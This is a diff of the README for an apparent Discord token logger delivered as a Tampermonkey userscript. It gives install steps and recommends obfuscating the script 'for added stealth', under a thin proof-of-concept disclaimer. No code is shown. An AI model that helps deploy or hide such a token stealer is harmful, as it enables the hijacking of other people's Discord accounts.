@@ -1,15 +1,15 @@
-<h1 align="center">Tampermonkey Tokenlogger</h1>
+<h1 align="center">Proof of Concept Tampermonkey Discord Token Logger</h1>
 
-<p align="center">Proof of Concept Discord Token Logger: A demonstration tool to highlight the vulnerability of Discord accounts by logging user tokens.</p>
+<p align="center">A demonstration tool to highlight the vulnerability of Discord accounts by logging user tokens.</p>
 
 <div align="center">
     <a href="https://lyzev.github.io/discord/"><img src="https://img.shields.io/discord/610120595765723137?logo=discord" alt="Discord"/></a>
     <br><br>
-    <img src="https://img.shields.io/github/last-commit/Lyzev/tokenlogger" alt="GitHub last commit"/>
-    <img src="https://img.shields.io/github/commit-activity/w/Lyzev/tokenlogger" alt="GitHub commit activity"/>
+    <img src="https://img.shields.io/github/last-commit/Lyzev/DiscordTokenLogger" alt="GitHub last commit"/>
+    <img src="https://img.shields.io/github/commit-activity/w/Lyzev/DiscordTokenLogger" alt="GitHub commit activity"/>
     <br>
-    <img src="https://img.shields.io/github/languages/code-size/Lyzev/tokenlogger" alt="GitHub code size in bytes"/>
-    <img src="https://img.shields.io/github/contributors/Lyzev/tokenlogger" alt="GitHub contributors"/>
+    <img src="https://img.shields.io/github/languages/code-size/Lyzev/DiscordTokenLogger" alt="GitHub code size in bytes"/>
+    <img src="https://img.shields.io/github/contributors/Lyzev/DiscordTokenLogger" alt="GitHub contributors"/>
 </div>
 
 ## Disclaimer
@@ -32,16 +32,16 @@ On the different page (e.g.: [YouTube](https://youtube.com)) the script gets the
 ## Usage
 
 ### Install
-1. Download the [tokenlogger.js](https://github.com/Lyzev/tokenlogger/releases/latest) file
+1. Download the [DiscordTokenLogger.js](https://github.com/Lyzev/DiscordTokenLogger/releases/latest) file
 2. Open Tampermonkey in your Browser
 3. Go to the Utilities tab
 4. Press the button 'Choose File' at 'Import from file'
-5. Choose the downloaded [tokenlogger.js](https://github.com/Lyzev/tokenlogger/releases/latest) file
+5. Choose the downloaded [DiscordTokenLogger.js](https://github.com/Lyzev/DiscordTokenLogger/releases/latest) file
 6. Click on install in the tab that has opened
 7. Have fun!
 
 ### Obfuscation
-The tokenlogger can also be obfuscated. For example you can use [obfuscator.io](https://obfuscator.io/).
+The Discord Token Logger can be obfuscated with [obfuscator.io](https://obfuscator.io/) (and more) for added stealth. Keep in mind that hacking is unethical and illegal. Use this information responsibly.
 
 ## Bugs and Suggestions
 
@@ -49,4 +49,4 @@ The tokenlogger can also be obfuscated. For example you can use [obfuscator.io](
 If you need support, you can join [this](https://lyzev.github.io/discord/) Discord server.
 
 ### GitHub
-Bug reports and suggestions should be made in this repo's [issue tracker](https://github.com/Lyzev/tokenlogger/issues) using the templates provided. Please provide as much information as you can to best help us understand your issue and give a better chance of it being resolved.
+Bug reports and suggestions should be made in this repo's [issue tracker](https://github.com/Lyzev/DiscordTokenLogger/issues) using the templates provided. Please provide as much information as you can to best help us understand your issue and give a better chance of it being resolved.
